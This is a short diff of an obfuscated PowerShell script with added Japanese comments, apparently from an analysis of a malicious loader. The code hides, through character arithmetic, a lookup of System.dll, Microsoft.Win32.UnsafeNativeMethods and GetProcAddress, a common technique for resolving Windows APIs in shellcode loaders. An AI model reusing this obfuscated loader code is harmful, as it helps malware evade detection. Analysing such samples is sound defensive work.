@@ -128,8 +128,8 @@ FUncTIon Get-PZ2zmpurexnDXVSxx {
     WheRe-ObJecT { 
         $_.GlobalAssemblyCache -And $_.Location.Split(""+[cHaR](6474-6382)+"")[-1].Equals(""+[cHAR](8862-8779)+[CHaR](9611-9490)+[chaR](4982-4867)+[chaR]([bYtE] 0xb6-0x42)+[cHar](1707-1606)+[chaR](7297-7188)+[CHAR](1332-1286)+[cHaR]([Byte] 0xba-0x56)+[Char](7772-7664)+[char](6965-6857)+"")
      }).GetType("Microsoft."+[cHar]([BYTE] 0xae-0x57)+[cHaR](5622-5517)+[ChaR](8858-8748)+[chaR]([byTe] 0x56-0x23)+[chAR](1248-1198)+[ChaR](877-831)+[CHAR](4158-4073)+[ChaR](4512-4402)+"safeNativeMethods")
-# [AppDomain]::CurrentDomain.GetAssemblies()でロードされているアセンブリを取得し、System.dllがロードされている確認
-# ロードされているSystem.dllをGetTypeを使用して、「Microsoft.Win32.UnsafeNativeMethods」を取得
+# [AppDomain]::CurrentDomain.GetAssemblies()でロードされているアセンブリを取得し、System.dllがロードされている「Equals」メソッドで確認
+# ロードされているSystem.dllが「Microsoft.Win32.UnsafeNativeMethods」がどうか「.GetType」メソッドで確認
     $IqnMnVucT=@()
     $IObr8mVbBcalgmD.GetMethods() | FOrEaCH-ObJEct {
         If($_.Name -LiKe "Ge*P*oc*"+[char](8884-8784)+[cHaR](6481-6381)+[cHAr](4918-4804)+[chAr]([bYTe] 0xc7-0x62)+[cHAR](859-744)+"s") {
